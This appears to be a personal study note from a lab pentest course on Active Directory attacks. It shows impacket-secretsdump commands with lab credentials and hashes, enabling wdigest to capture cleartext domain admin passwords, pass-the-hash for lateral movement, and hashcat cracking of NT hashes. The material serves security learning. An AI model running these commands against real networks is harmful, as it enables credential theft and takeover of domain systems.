# Dumping credentials using impacket-secretsdump
----
- We should go on **==every machine and dump secrets from there==** to find valuable stuff from all the machines.
- It basically **combines all the stuff from `psexec`**
- `impacket-secretsdump MARVEL.local/fcastle:'Password1'@10.0.1.9`
	- ![[Pasted image 20250329161813.png]]
- `wdigest`: Available on older windows (7, 8, XP)
	- We can see ==`**domain admin` password** if they have logged in from secretsdump **in clear text**.==
	- We can enable `wdigest` with local admin access on machine and wait for domain admin to login
- We got `pparker` from Spiderman:
	- ![[Pasted image 20250329162248.png]]
- We can obv. use hashes instead of password as well:
	- `impacket-secretsdump pparker:@10.0.1.10 -hashes aad3b435b51404eeaad3b435b51404ee:e08e15bd995aa26400e3107deb56bb16`
		- ![[Pasted image 20250329163049.png]]

# Though Process
---
- ==We should always try to run the **obtained hashes on other machines** as well to gain access to **new machines** if that admin is present==
- **Lateral Movement**
![[Pasted image 20250329163153.png]]


# Cracking The Hashes
----
- We only **need the NT (later) portion** for cracking the hashes:
	- `echo 7facdc498ed1680c4fd1448319a8c04f > administrator_dc2_hash`
	- `hashcat administrator_dc2_hash /usr/share/wordlists/rockyou.txt -m 1000`
		- ![[Pasted image 20250329163630.png]]